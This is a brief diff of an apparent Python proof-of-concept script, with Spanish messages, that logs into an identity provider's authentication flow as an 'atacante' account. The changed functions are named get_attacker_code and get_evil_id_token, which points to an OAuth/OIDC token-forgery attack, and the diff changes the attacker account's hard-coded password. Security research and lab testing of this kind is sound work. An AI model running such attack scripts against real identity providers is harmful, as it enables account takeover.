@@ -66,7 +66,7 @@ def get_attacker_code(variant):
     h = {"Accept": "application/json"}
     s.get(ex, headers=h, timeout=10)
     s.post(ex, json={"uid_field": "atacante"}, headers=h, timeout=10)
-    r = s.post(ex, json={"password": "Atacante2026!"}, headers=h, timeout=10)
+    r = s.post(ex, json={"password": "12345"}, headers=h, timeout=10)
     if r.json().get("component") != "xak-flow-redirect":
         raise RuntimeError("no se pudo loguear como atacante")
     params = {
@@ -176,7 +176,7 @@ def get_evil_id_token():
     ex = f"{OP_INTERNAL_URL}/api/v3/flows/executor/default-authentication-flow/"
     s.get(ex, headers=h, timeout=10)
     s.post(ex, json={"uid_field": "atacante"}, headers=h, timeout=10)
-    r = s.post(ex, json={"password": "Atacante2026!"}, headers=h, timeout=10)
+    r = s.post(ex, json={"password": "12345"}, headers=h, timeout=10)
     if r.json().get("component") != "xak-flow-redirect":
         raise RuntimeError("no se pudo loguear como atacante")
     params = {
